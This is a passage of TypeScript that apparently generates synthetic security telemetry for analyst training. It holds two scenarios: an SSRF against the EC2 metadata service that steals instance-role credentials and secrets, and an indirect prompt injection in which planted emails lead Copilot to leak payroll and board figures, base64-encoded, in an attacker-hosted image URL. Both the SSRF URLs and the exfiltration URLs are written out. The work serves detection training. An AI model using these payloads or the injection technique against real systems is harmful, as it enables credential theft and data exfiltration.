      url: `https://${AG_ALB_HOST}${o.uri}${o.args ? `?${o.args}` : ""}`,
      domain: AG_ALB_HOST, method: "GET", user_agent: AG_UA_HTTP,
    },
    description: o.description,
    raw: {
      formatVersion: 1,
      timestamp: ep(o.ts),
      webaclId: AG_WEB_ACL,
      terminatingRuleId: "Default_Action",
      terminatingRuleType: "REGULAR",
      action: "ALLOW",
      httpSourceName: "ALB",
      httpSourceId: AG_ALB_ID,
      rateBasedRuleList: [],
      nonTerminatingMatchingRules: [],
      requestHeadersInserted: null,
      responseCodeSent: null,
      "httpRequest.clientIp": AG_IP,
      "httpRequest.country": "IN",
      "httpRequest.httpMethod": "GET",
      "httpRequest.uri": o.uri,
      "httpRequest.args": o.args,
      "httpRequest.httpVersion": "HTTP/1.1",
      "httpRequest.requestId": o.requestId,
      "httpRequest.headers[0].name": "Host",
      "httpRequest.headers[0].value": AG_ALB_HOST,
      "httpRequest.headers[1].name": "User-Agent",
      "httpRequest.headers[1].value": AG_UA_HTTP,
      "httpRequest.headers[2].name": "Accept",
      "httpRequest.headers[2].value": "*/*",
      "cloud.provider": "aws",
      "cloud.region": "us-east-1",
      "action_result": "allowed",
    },
  };
}

/** A call made with the stolen instance-role session, from the agent's address. */
const agUse = (
  o: Pick<CtOpts, "id" | "ts" | "name" | "source" | "requestId" | "severity" | "description" | "eventType"> & Partial<CtOpts>,
): TelemetryEvent =>
  ct({ region: "us-east-1", ip: AG_IP, ua: AG_UA_BOTO, ident: agRole, readOnly: true, geo: AG_GEO, user_title: "Service Account", ...o });

const AI_AGENTIC_INTRUSION_TEMPO: TelemetryEvent[] = [
  // 1. BASELINE. The instance role's normal use: the API host itself, private address, the Java SDK.
  ct({
    id: "aiag1", ts: "2026-09-23T02:02:16.240Z", name: "GetObject", source: "s3.amazonaws.com", region: "us-east-1",
    ip: AG_INSTANCE_IP, ua: AG_UA_JAVA, ident: agRole, readOnly: true, management: false,
    eventType: "cloud_storage_access", severity: "informational", user_title: "Service Account", baseline: true,
    params: { bucketName: "customer-api-exports", key: "exports/daily/2026-09-22.csv" },
    extra: { "aws.cloudtrail.additional_event_data.bytes_transferred_out": "3120448" },
    requestId: "d20c7e91-a5b8-4f36-8c04-19e6b3a7d582",
    description:
      "GetObject on customer-api-exports/exports/daily/2026-09-22.csv by the customer-api-instance-role session on instance i-0b7e41c93a5d28f60 (access key ASIAXH3KQ7NZH4B2TRWD, created at 22:41 UTC the previous evening), from the instance's own private address 172.16.10.30 with the AWS SDK for Java: the API's nightly export read. The session's credentials were delivered by IMDSv1 (ec2RoleDelivery 1.0).",
  }),

  // 2. RECON. The API description is downloaded (T1595.002).
  agWaf({
    id: "aiag2", ts: "2026-09-23T02:31:04.118Z", uri: "/api/v1/openapi.json", args: "",
    requestId: "1-6ab339e8-3c1f5a7d9e2b40860d4c7a13", severity: "low", mitre: "T1595.002", tactic: "Reconnaissance",
    description:
      "AWS WAF allowed GET /api/v1/openapi.json on the customer API load balancer from 159.89.212.66 (Bangalore, India; a DigitalOcean address) with a python-httpx user agent. First request from this address; the web ACL's default action allowed it.",
  }),

  // 3. RECON. An endpoint named in that specification is called 353 ms later (T1595.002; ATLAS AML.T0053).
  agWaf({
    id: "aiag3", ts: "2026-09-23T02:31:04.471Z", uri: "/api/v1/customers", args: "page=1&page_size=1",
    requestId: "1-6ab339e8-7b2e9d04c15a3f68e0a4b921", severity: "low", mitre: "T1595.002", tactic: "Reconnaissance",
    description:
      "353 milliseconds after the specification download, the same address and user agent requested /api/v1/customers, an endpoint listed in the document it had just fetched. A person cannot read a specification and pick an endpoint in a third of a second; this is a script or an agent working from the API description (the tempo documented in MITRE campaign C0062, ATLAS AML.T0053 AI Agent Tool Invocation).",
  }),

  // 4. SSRF, step one: the link-preview feature is pointed at the metadata service (T1190).
  agWaf({
    id: "aiag4", ts: "2026-09-23T02:34:47.531Z", uri: "/api/v1/link-preview",
    args: "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
    requestId: "1-6ab33ac7-2e8a4c1d6f0b95a3d7e14c80", severity: "high", mitre: "T1190", tactic: "Initial Access",
    description:
      "AWS WAF allowed GET /api/v1/link-preview whose url parameter is the EC2 metadata address 169.254.169.254 (path /latest/meta-data/iam/security-credentials/), 3 minutes 43 seconds after the mapping requests. The managed rule groups did not match, so an allowed request says nothing about whether the application then fetched the internal URL.",
  }),

  // 5. SSRF, step two: the role name read from the previous answer is used within a second (T1552.005).
  agWaf({
    id: "aiag5", ts: "2026-09-23T02:34:48.402Z", uri: "/api/v1/link-preview",
    args: "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fcustomer-api-instance-role",
    requestId: "1-6ab33ac8-9a04d7e2b5c18f3e6a2d0b47", severity: "critical", mitre: "T1552.005", tactic: "Credential Access",
    description:
      "0.87 seconds after the first metadata request, the same address asked link-preview for the credentials of role customer-api-instance-role, a name that only the previous response contained. Read the answer, extract the name, ask again: under a second, with no pause a person needs to read (ATLAS AML.T0053).",
  }),

  // 6. FIRST USE of the stolen session, off the instance (T1078.004).
  agUse({
    id: "aiag6", ts: "2026-09-23T02:35:09.377Z", name: "ListSecrets", source: "secretsmanager.amazonaws.com",
    host: "secretsmanager.us-east-1.amazonaws.com", requestId: "8f1a56c3-e047-4d92-b3a8-5c90d21e7f64",
    eventType: "cloud_api_call", severity: "critical", mitre: "T1078.004", tactic: "Initial Access",
    description:
      "ListSecrets by the customer-api-instance-role session (access key ASIAXH3KQ7NZH4B2TRWD) from 159.89.212.66 in India with a Boto3 Linux user agent: the same session key the instance itself used at 02:02 from 172.16.10.30. Instance-role credentials are being used off the instance, 21 seconds after the metadata request.",
  }),

  // 7. Secrets, immediately (T1555.006).
  agUse({
    id: "aiag7", ts: "2026-09-23T02:35:09.802Z", name: "GetSecretValue", source: "secretsmanager.amazonaws.com",
    params: { secretId: "prod/customer-api/db-reader" },
    host: "secretsmanager.us-east-1.amazonaws.com", requestId: "1c73e08b-9a24-4f51-86d0-b7e5a3c2194d",
    eventType: "cloud_api_call", severity: "high", mitre: "T1555.006", tactic: "Credential Access",
    description:
      "GetSecretValue for prod/customer-api/db-reader by the same session from 159.89.212.66, 0.43 seconds after ListSecrets returned. The role is allowed to read this secret because the API needs it, which is why the call succeeds.",
  }),

  // 8. Secrets, everything in the list: including one nothing legitimate reads (T1555.006; ATLAS AML.T0053).
  agUse({
    id: "aiag8", ts: "2026-09-23T02:35:10.215Z", name: "GetSecretValue", source: "secretsmanager.amazonaws.com",
    params: { secretId: "prod/customer-api/legacy-reporting-key" },
    host: "secretsmanager.us-east-1.amazonaws.com", requestId: "e45b9d70-2f16-4a83-9c1e-08a7d6b3f529",
    eventType: "cloud_api_call", severity: "high", mitre: "T1555.006", tactic: "Credential Access",
    description:
      "GetSecretValue for prod/customer-api/legacy-reporting-key by the same session, 0.41 seconds after the previous read. This secret holds the access key of svc-reporting-sync, a decoy IAM user with no permissions that the security team planted; no application or person reads it. Reading every secret in a listing, at machine tempo, is collection without judgement (ATLAS AML.T0053).",
  }),

  // 9. THE DECOY TRIPS. The planted key is tried within a second (T1078.004).
  ct({
    id: "aiag9", ts: "2026-09-23T02:35:11.094Z", name: "ListBuckets", source: "s3.amazonaws.com", region: "us-east-1",
    ip: AG_IP, ua: AG_UA_BOTO, ident: agDecoy, readOnly: true, geo: AG_GEO, user_title: "Service Account",
    fail: {
      code: "AccessDenied",
      message: `User: arn:aws:iam::${AWS_ACCOUNT}:user/svc-reporting-sync is not authorized to perform: s3:ListAllMyBuckets because no identity-based policy allows the s3:ListAllMyBuckets action`,
    },
    requestId: "a90f3c26-d158-4b74-8e05-c62b17e4d983",
    eventType: "cloud_api_call", severity: "critical", mitre: "T1078.004", tactic: "Initial Access",
    description:
      "ListBuckets by IAM user svc-reporting-sync (access key AKIAXH3KQ7NZ5D8MWPRC) from 159.89.212.66 returned AccessDenied, 0.88 seconds after the decoy secret was read, with the same Boto3 user agent as the role's calls. The decoy user has no permissions and its key exists in only one place, the secret read at 02:35:10: whatever collected the credentials tried each one immediately, without deciding which were worth trying (ATLAS AML.T0053).",
  }),

  // 10. COLLECTION. A large object read that is not the daily export (T1530).
  agUse({
    id: "aiag10", ts: "2026-09-23T02:36:02.660Z", name: "GetObject", source: "s3.amazonaws.com", management: false,
    params: { bucketName: "customer-api-exports", key: "exports/full/customer-ledger-2026-09.csv.gz" },
    extra: { "aws.cloudtrail.additional_event_data.bytes_transferred_out": "412096512" },
    requestId: "5d2e81b4-c709-4a36-9f18-63e0a4d7b215",
    eventType: "cloud_storage_access", severity: "critical", mitre: "T1530", tactic: "Collection",
    description:
      "GetObject on customer-api-exports/exports/full/customer-ledger-2026-09.csv.gz by the same instance-role session from 159.89.212.66, 412,096,512 bytes transferred out. The 02:02 read from the instance was a 3 MB daily export; this is a different object, more than a hundred times larger, and the caller is off the instance.",
  }),

  // 11. DETECTION. GuardDuty InstanceCredentialExfiltration.OutsideAWS (T1552.005).
  gd({
    id: "aiag11", ts: "2026-09-23T02:47:33.918Z", type: "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS", score: 8,
    title: "Credentials for instance role customer-api-instance-role were used from an external IP address.",
    api: "ListSecrets", service: "secretsmanager.amazonaws.com", ip: AG_IP, country: "India", asn: "DigitalOcean, LLC",
    region: "us-east-1", ident: agRole, instanceId: AG_INSTANCE, geo: AG_GEO, severity: "high", mitre: "T1552.005", tactic: "Credential Access",
    seen: "2026-09-23T02:35:09.377Z",
    detail: "Credentials that were created exclusively for an EC2 instance through an instance launch role are being used from an external IP address.",
    extra: {
      "aws.guardduty.resource.instanceDetails.instanceType": "m6i.large",
      "aws.guardduty.resource.instanceDetails.availabilityZone": "us-east-1b",
      "aws.guardduty.resource.instanceDetails.imageId": "ami-0c8f2d1a94b7e3560",
    },
    description:
      "GuardDuty raised UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS (severity 8, High): credentials created for EC2 instance i-0b7e41c93a5d28f60 through its role are being used from an external address, 159.89.212.66. Raised 12 minutes after the first off-instance call; by then the secrets and the export object had already been read.",
  }),

  // 12. CONTAINMENT. AWSRevokeOlderSessions invalidates the stolen session.
  ct({
    id: "aiag12", ts: "2026-09-23T03:04:18.412Z", name: "PutRolePolicy", source: "iam.amazonaws.com", region: "us-east-1",
    ip: AG_ADMIN_EGRESS, ua: UA_CHROME_MAC, ident: agResponder, readOnly: false, eventType: "cloud_role_change", severity: "medium",
    params: {
      roleName: "customer-api-instance-role",
      policyName: "AWSRevokeOlderSessions",
      policyDocument: JSON.stringify({
        Version: "2012-10-17",
        Statement: [{ Effect: "Deny", Action: ["*"], Resource: ["*"], Condition: { DateLessThan: { "aws:TokenIssueTime": "2026-09-23T03:04:18.000Z" } } }],
      }),
    },
    requestId: "f37a08d5-1b64-4c92-a5e0-9d2c73b8e146",
    description:
      "PutRolePolicy: an MFA-authenticated AWSReservedSSO_SecurityResponder session attached the inline policy AWSRevokeOlderSessions to customer-api-instance-role, denying every session issued before 03:04:18 UTC, which invalidates the stolen session key. Requiring IMDSv2 on the instance and validating the link-preview URL in the application are the follow-up fixes.",
  }),
];

// ═══════════════════════════════════════════════════════════════════════════════
// STORY 3: ai-copilot-indirect-injection
// Zero-click indirect prompt injection against Microsoft 365 Copilot (EchoLeak class, CVE-2025-32711
// pattern). Authored on NexaCorp; adapted to MedCore and GlobalLogis.
// ═══════════════════════════════════════════════════════════════════════════════

const CP_USER = "d.cohen@nexacorp.com";
const CP_HOST = "WS-HR-1182";
const CP_HOST_IP = "10.10.20.82";
const CP_EGRESS_IP = "212.150.61.20";
const CP_SENDER = "accounts@brightline-procurement.com";
const CP_SENDER_DISPLAY = "Brightline Procurement Desk";
const CP_SENDER_IP = "62.210.148.77";               // hosting provider, Paris (resolves to France)
const CP_SENDER_GEO = { country: "France", city: "Paris", latitude: 48.8566, longitude: 2.3522 };
const CP_LABEL_ID = "a3c5e7b9-2d14-4f68-9e0a-6b8d1c3f5a72";
const CP_PROXY_HOST = "eu-prod.asyncgw.teams.microsoft.com";

const CP_MAIL1 = { subject: "Supplier onboarding: updated remittance checklist", msgId: "<7f3a91c2e4b84d0f9a6c1e2b5d708a44@brightline-procurement.com>", netId: "4e1b7a92-6c03-4d58-a9f1-2b8d05e3c761" };
const CP_MAIL2 = { subject: "Reminder: annual policy acknowledgement due", msgId: "<2d84e6b09f1a43c7a5e03b9c81d6f277@brightline-procurement.com>", netId: "9a02d5f7-1b68-4e34-8c7a-d30e46b1f985" };
const CP_MAIL3 = { subject: "Q3 expense reimbursement: frequently asked questions", msgId: "<b19c50e7a3d24f86901e7c4a2b58d3f0@brightline-procurement.com>", netId: "36f8c1a4-d905-4b27-a6e2-0c7b93d5e148" };

/** Defender for Office 365 record for one inbound message (EmailEvents style plus auth results). */
function cpMail(o: { id: string; ts: string; mail: typeof CP_MAIL1; description: string }): TelemetryEvent {
  return {
    id: o.id, ts: o.ts, source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
    user_email: CP_USER, src_ip: CP_SENDER_IP, severity: "low", geo: CP_SENDER_GEO,
    mitre_technique: "T1566", mitre_tactic: "Initial Access",
    description: o.description,
    raw: {
      "email.from.display_name": CP_SENDER_DISPLAY,
      "email.from.address": CP_SENDER,
      "email.sender.address": CP_SENDER,
      "email.to.address": CP_USER,
      "email.subject": o.mail.subject,
      "email.direction": "inbound",
      "email.message_id": o.mail.msgId,
      "email.spf": "pass",
      "email.dkim": "pass",
      "email.dmarc": "pass",
      "email.auth.compauth": "pass",
      "data.office365.Directionality": "Inbound",
      "data.office365.DeliveryAction": "Delivered",
      "data.office365.DeliveryLocation": "Inbox",
      "data.office365.ThreatType": "None",
      "data.office365.SpamConfidenceLevel": "0",
      "data.office365.Sender": CP_SENDER,
      "data.office365.SenderFromDomain": "brightline-procurement.com",
      "data.office365.SenderIp": CP_SENDER_IP,
      "data.office365.NetworkMessageId": o.mail.netId,
      "data.office365.InternetMessageId": o.mail.msgId,
      "data.office365.MailboxOwnerUPN": CP_USER,
      "data.office365.Subject": o.mail.subject,
      "data.office365.AttachmentCount": "0",
      "data.office365.UrlCount": "0",
      "data.office365.RecipientEmailAddress": CP_USER,
      "data.office365.SenderDisplayName": CP_SENDER_DISPLAY,
      "data.office365.EmailDirection": "Inbound",
      "data.office365.EmailLanguage": "en",
      "data.office365.LatestDeliveryAction": "Delivered",
      "data.office365.LatestDeliveryLocation": "Inbox",
      "data.office365.AuthenticationDetails": "{\"SPF\":\"pass\",\"DKIM\":\"pass\",\"DMARC\":\"pass\",\"CompAuth\":\"pass\"}",
      "data.office365.CreationTime": o.ts,
      "source.ip": CP_SENDER_IP,
      "action_result": "allowed",
    },
  };
}

/** Deterministic hex string, so a rebuild is identical and ids look opaque. */
function hex(seed: string, len: number): string {
  let h = 2166136261 >>> 0;
  let out = "";
  for (let n = 0; out.length < len; n++) {
    for (let k = 0; k < seed.length; k++) {
      h ^= seed.charCodeAt(k) + n;
      h = Math.imul(h, 16777619) >>> 0;
    }
    out += h.toString(16).padStart(8, "0");
  }
  return out.slice(0, len);
}

const CP_ORG_ID = "6d1f9a3e-4b27-4c85-9e10-a7c53f82b9d4";
const CP_USER_KEY = "3b8e5d02-7a61-49c4-b1f3-e2094c7a58d6";

interface CpResource { name: string; type: string; email?: boolean; label?: boolean }

/**
 * Purview audit record, Operation CopilotInteraction, in the published AuditData shape:
 * Messages[] and AccessedResources[] as arrays of objects. XPIADetected is written on the
 * email items (the cross-prompt-injection classifier looked at them and did not flag them).
 * There is no prompt or response text in this record.
 */
function cpCopilot(o: {
  id: string; ts: string; recordId: string; threadId: string; resources: CpResource[];
  severity: TelemetryEvent["severity"]; description: string; baseline?: boolean;
  mitre?: string; tactic?: string;
}): TelemetryEvent {
  const t = Date.parse(o.ts);
  return {
    id: o.id, ts: o.ts, source: "o365", vendor: "Microsoft Purview", event_type: "cloud_api_call",
    user_email: CP_USER, src_ip: CP_EGRESS_IP, severity: o.severity,
    ...(o.mitre ? { mitre_technique: o.mitre } : {}),
    ...(o.tactic ? { mitre_tactic: o.tactic } : {}),
    ...(o.baseline ? { is_baseline: true, expected_verdict: "informational" as const } : {}),
    description: o.description,
    raw: {
      "data.office365.Id": o.recordId,
      "data.office365.CreationTime": o.ts.replace(/\.\d{3}Z$/, ""),
      "data.office365.Operation": "CopilotInteraction",
      "data.office365.RecordType": "261",
      "data.office365.Workload": "Copilot",
      "data.office365.OrganizationId": CP_ORG_ID,
      "data.office365.UserKey": CP_USER_KEY,
      "data.office365.UserType": "0",
      "data.office365.UserId": CP_USER,
      "data.office365.ClientIP": CP_EGRESS_IP,
      "data.office365.AppIdentity": "Copilot.MicrosoftCopilot.BizChat",
      "data.office365.CopilotEventData.AppHost": "BizChat",
      "data.office365.CopilotEventData.ThreadId": o.threadId,
      "data.office365.CopilotEventData.Messages": [
        { Id: String(t), isPrompt: true, JailbreakDetected: false },
        { Id: String(t + 1287), isPrompt: false },
      ],
      "data.office365.CopilotEventData.AccessedResources": o.resources.map(r => ({
        Action: "Read",
        Id: r.email ? `AAMk${hex(`res:${r.name}`, 40)}` : `01${hex(`res:${r.name}`, 32).toUpperCase()}`,
        Name: r.name,
        Type: r.type,
        ...(r.label ? { SensitivityLabelId: CP_LABEL_ID } : {}),
        Status: "success",
        ...(r.email ? { XPIADetected: false } : {}),
      })),
      "data.office365.Version": "1",
      "source.ip": CP_EGRESS_IP,
      "user.email": CP_USER,
      "user.name": "NEXACORP\\d.cohen",
      "event.action": "CopilotInteraction",
      "event.type": "access",
      "event.outcome": "success",
      "event.module": "o365",
      "event.dataset": "o365.audit",
      "event.provider": "Copilot",
      "event.created": new Date(t + 3_120).toISOString(),
      "action_result": "allowed",
    },
  };
}

/** Zscaler NSS web record: a request to the Teams URL-preview endpoint. */
function cpProxy(o: {
  id: string; ts: string; url: string; bytesOut: number; bytesIn: number;
  severity: TelemetryEvent["severity"]; description: string; baseline?: boolean; mitre?: string; tactic?: string;
}): TelemetryEvent {
  const category = "Web Conferencing";
  return {
    id: o.id, ts: o.ts, source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
    user_email: CP_USER, hostname: CP_HOST, src_ip: CP_HOST_IP, dst_port: 443, protocol: "tcp", severity: o.severity,
    ...(o.mitre ? { mitre_technique: o.mitre } : {}),
    ...(o.tactic ? { mitre_tactic: o.tactic } : {}),
    ...(o.baseline ? { is_baseline: true, expected_verdict: "informational" as const } : {}),
    network: { url: o.url, domain: CP_PROXY_HOST, method: "GET", status: 200, bytes_out: o.bytesOut, bytes_in: o.bytesIn, user_agent: UA_EDGE_WIN },
    description: o.description,
    raw: {
      "zscaler.action": "Allowed",
      "zscaler.url": o.url.replace(/^https?:\/\//, ""),
      "zscaler.hostname": CP_PROXY_HOST,
      "zscaler.urlcategory": category,
      "zscaler.appname": "Microsoft Teams",
      "zscaler.login": CP_USER,
      "zscaler.reqsize": String(o.bytesOut),
      "zscaler.respsize": String(o.bytesIn),
      "action": "allowed",
      "action_result": "allowed",
      "event.action": "web-access",
      "event.category": "network",
      "url.full": o.url,
      "url.domain": CP_PROXY_HOST,
      "url.category": category,
      "http.request.method": "GET",
      "http.response.status_code": "200",
      "http.user_agent": UA_EDGE_WIN,
      "source.ip": CP_HOST_IP,
      "source.user.name": "d.cohen",
      "user.email": CP_USER,
    },
  };
}

// The value of the ref parameter is base64 of a short internal string (decodes as noted in each description).
const CP_REF_1 = "UTMgcGF5cm9sbCB0b3RhbDogNCw4MjAsMTEz";   // "Q3 payroll total: 4,820,113"
const CP_REF_2 = "UTMgYm9hcmQgZGVjazogcmV2ZW51ZSA0MS4y";   // "Q3 board deck: revenue 41.2"
const cpFetchUrl = (ref: string): string =>
  `https://${CP_PROXY_HOST}/urlp/v1/url/content?url=${encodeURIComponent(`https://assets.brightline-procurement.com/img/banner.png?ref=${ref}`)}&v=1`;

const AI_COPILOT_INDIRECT_INJECTION: TelemetryEvent[] = [
  // 1. BASELINE. A normal Copilot session: internal documents only.
  cpCopilot({
    id: "aicp1", ts: "2026-09-24T08:41:12.508Z", recordId: "0f3c9a51-2d4e-4b7a-9e61-6a1d2c3b4e5f",
    threadId: "19:Kp7vT2mQx9RwZ4nLd8cYb1JhEo3UfAa6sG5iNt0XyV2k@thread.v2",
    resources: [
      { name: "Team_Offsite_Agenda_Q4.docx", type: "docx" },
      { name: "Onboarding_Checklist_2026.docx", type: "docx" },
    ],
    severity: "informational", baseline: true,
    description:
      "Purview logged a CopilotInteraction for d.cohen in BizChat at 08:41: two internal Word documents were read, no external item, no sensitivity label, JailbreakDetected false. This is a normal session. The record holds message IDs and resource names only, not the prompt or the answer.",
  }),

  // 2. DELIVERY. First message from an external sender, no link and no attachment (T1566; ATLAS AML.T0051.001, AML.T0070).
  cpMail({
    id: "aicp2", ts: "2026-09-24T09:12:37.214Z", mail: CP_MAIL1,
    description:
      "accounts@brightline-procurement.com (mail server 62.210.148.77, France) delivered 'Supplier onboarding: updated remittance checklist' to d.cohen at 09:12: SPF, DKIM and DMARC pass, no links, no attachments, delivered to the inbox. In Threat Explorer's body preview one paragraph is written as instructions to an AI assistant, not to the reader. Nothing asks the recipient to click or open anything (ATLAS AML.T0051.001 Indirect Prompt Injection, AML.T0070 RAG Poisoning).",
  }),

  // 3. DELIVERY. Second message, unrelated topic, 26 seconds later (T1566).
  cpMail({
    id: "aicp3", ts: "2026-09-24T09:13:03.671Z", mail: CP_MAIL2,
    description:
      "26 seconds later the same sender and mail server delivered 'Reminder: annual policy acknowledgement due' to d.cohen, with the same profile: authenticated, no links, no attachments, delivered to the inbox. A different business topic from the first message.",
  }),

  // 4. DELIVERY. Third message, a third topic (T1566).
  cpMail({
    id: "aicp4", ts: "2026-09-24T09:13:41.925Z", mail: CP_MAIL3,
    description:
      "38 seconds after that, 'Q3 expense reimbursement: frequently asked questions' arrived from the same sender and mail server. Three unrelated business subjects from one external sender within about a minute, none needing a reply: text written to be retrieved whichever question the user later asks Copilot (RAG spraying).",
  }),

  // 5. BASELINE. The same Teams endpoint, used the way Teams normally uses it.
  cpProxy({
    id: "aicp5", ts: "2026-09-24T09:47:52.316Z", baseline: true, severity: "informational",
    url: `https://${CP_PROXY_HOST}/urlp/v1/url/content?url=${encodeURIComponent("https://www.reuters.com/markets/")}&v=1`,
    bytesOut: 1184, bytesIn: 36420,
    description:
      "WS-HR-1182 requested a link preview through the Teams URL-preview endpoint for https://www.reuters.com/markets/. Teams calls /urlp/ on this host whenever a user pastes a link into a chat, so requests to this path are normal. The url parameter is a well-known news site and the request carries no extra data parameter.",
  }),

  // 6. THE COPILOT RECORD. External mail and a labelled payroll file in one session (T1213.002; ATLAS AML.T0051.001, AML.T0057).
  cpCopilot({
    id: "aicp6", ts: "2026-09-24T10:26:19.342Z", recordId: "6c2a8e14-b7d3-4590-a1f8-3e5b90c7d246",
    threadId: "19:Wq3nDz8YtR1bXc6VgL0mKe5HuPj2oIaA9sFv4TyNx7Cs@thread.v2",
    resources: [
      { name: CP_MAIL1.subject, type: "Email", email: true },
      { name: CP_MAIL2.subject, type: "Email", email: true },
      { name: "Payroll_2026.xlsx", type: "xlsx", label: true },
    ],
    severity: "medium", mitre: "T1213.002", tactic: "Collection",
    description:
      "Purview logged a CopilotInteraction for d.cohen in BizChat at 10:26:19: one session read two external emails from brightline-procurement.com (delivered at 09:12 and 09:13) and Payroll_2026.xlsx, which carries a sensitivity label. XPIADetected is false on both emails and JailbreakDetected is false on the prompt: the classifiers did not flag the mail, so the absence of a flag is not evidence of safety. The record holds message IDs only, no prompt or answer text (ATLAS AML.T0051.001, AML.T0057 LLM Data Leakage).",
  }),

  // 7. THE FETCH. Four seconds later the client asks the Teams proxy for an external image (T1567; ATLAS AML.T0077).
  cpProxy({
    id: "aicp7", ts: "2026-09-24T10:26:23.180Z", severity: "high", mitre: "T1567", tactic: "Exfiltration",
    url: cpFetchUrl(CP_REF_1), bytesOut: 1462, bytesIn: 1108,
    description:
      "3.8 seconds after that Copilot record, WS-HR-1182 requested the same Teams URL-preview endpoint, but the url parameter is https://assets.brightline-procurement.com/img/banner.png with a query value ref=UTMgcGF5cm9sbCB0b3RhbDogNCw4MjAsMTEz, base64 that decodes to 'Q3 payroll total: 4,820,113'. The domain is the sender of the three emails. Zscaler allowed it (a Microsoft-owned host, category Web Conferencing). No click is recorded: an image in the assistant's answer is fetched automatically, and the data leaves in the URL (ATLAS AML.T0077 LLM Response Rendering, AML.T0057).",
  }),

  // 8. THE SAME SEQUENCE AGAIN. A later, different Copilot session retrieves the same mail (T1213.002).
  cpCopilot({
    id: "aicp8", ts: "2026-09-24T10:58:44.729Z", recordId: "d81f3b57-0a92-4c6e-b4d5-72e8a1c39f60",
    threadId: "19:Ht6bVm1RqZ9sXw3KpC7dLe2NyOa4IuG8jFv0TnYx5Bs@thread.v2",
    resources: [
      { name: CP_MAIL2.subject, type: "Email", email: true },
      { name: CP_MAIL3.subject, type: "Email", email: true },
      { name: "Board_Deck_Q3.pptx", type: "pptx", label: true },
    ],
    severity: "medium", mitre: "T1213.002", tactic: "Collection",
    description:
      "A second CopilotInteraction for d.cohen at 10:58, 32 minutes after the first, in a different thread: two of the same external emails were read alongside Board_Deck_Q3.pptx, which carries a sensitivity label. XPIADetected is false on both emails and JailbreakDetected is false again. The mail is retrieved whatever the user asks about, so each session that pulls it in can carry a different document with it.",
  }),

  // 9. THE SAME FETCH AGAIN (T1567).
  cpProxy({
    id: "aicp9", ts: "2026-09-24T10:58:48.905Z", severity: "high", mitre: "T1567", tactic: "Exfiltration",
    url: cpFetchUrl(CP_REF_2), bytesOut: 1462, bytesIn: 1108,
    description:
      "4.2 seconds after the second Copilot record, WS-HR-1182 requested the Teams URL-preview endpoint for https://assets.brightline-procurement.com/img/banner.png with ref=UTMgYm9hcmQgZGVjazogcmV2ZW51ZSA0MS4y, which decodes to 'Q3 board deck: revenue 41.2'. Same destination as the first fetch, different data: the content of whatever labelled file that session read (ATLAS AML.T0077).",
  }),

  // 10. REMEDIATION. The three messages are removed from the mailbox; earlier fetches already happened.
  {
    id: "aicp10", ts: "2026-09-24T11:31:26.318Z", source: "email_gateway", vendor: "Microsoft Defender for Office 365",
    event_type: "email_quarantined", severity: "medium", user_email: CP_USER,
    description:
      "A security administrator removed the messages from brightline-procurement.com from d.cohen's mailbox with Threat Explorer (action Soft delete, trigger AdminAction) at 11:31, 33 minutes after the second fetch and after the data in both fetches had already left. This record is one of the three removals; the same message would be found in any mailbox that received it.",
    raw: {
      "email.from.address": CP_SENDER,
      "email.subject": CP_MAIL1.subject,
      "email.message_id": CP_MAIL1.msgId,
      "data.office365.ActionType": "Soft delete",
      "data.office365.ActionTrigger": "AdminAction",
      "data.office365.ActionResult": "Success",
      "data.office365.NetworkMessageId": CP_MAIL1.netId,
      "data.office365.InternetMessageId": CP_MAIL1.msgId,
      "data.office365.RecipientEmailAddress": CP_USER,
      "data.office365.Sender": CP_SENDER,
      "data.office365.CreationTime": "2026-09-24T11:31:26.318Z",
      "data.office365.Workload": "Exchange",
      "data.office365.Subject": CP_MAIL1.subject,
      "data.office365.MailboxOwnerUPN": CP_USER,
      "data.office365.DeliveryLocation": "Deleted items",
      "data.office365.Directionality": "Inbound",
      "data.office365.SenderIp": CP_SENDER_IP,
      "data.office365.SenderFromDomain": "brightline-procurement.com",
      "email.from.display_name": CP_SENDER_DISPLAY,
      "email.sender.address": CP_SENDER,
      "email.to.address": CP_USER,
      "email.direction": "inbound",
      "action_result": "blocked",
    },
  },
];

// ═══════════════════════════════════════════════════════════════════════════════
// Export
// ═══════════════════════════════════════════════════════════════════════════════

export const AI_ADVANCED_A_STORIES: AiStoryDef[] = [
  {
    id: "ai-bedrock-key-abuse",
    title: "Leaked CI Access Key: Bedrock LLMjacking",
    complexity: "advanced",
    companies: ["rocketstack", "globallogis"], // QuantumBank has its own LLMjacking story (aiLlmJacking pack)
    events: AI_BEDROCK_KEY_ABUSE,
  },
  {
    id: "ai-agentic-intrusion-tempo",
    title: "Machine-Speed Intrusion: SSRF to Instance Credentials, Decoy Key Trips",
    complexity: "advanced",
    companies: ["rocketstack", "globallogis", "quantumbank"],
    events: AI_AGENTIC_INTRUSION_TEMPO,
  },
  {
    id: "ai-copilot-indirect-injection",
    title: "Copilot Read the Email: Indirect Prompt Injection Leak",
    complexity: "advanced",
    companies: ["nexacorp", "medcore", "globallogis"],
    events: AI_COPILOT_INDIRECT_INJECTION,
  },
];
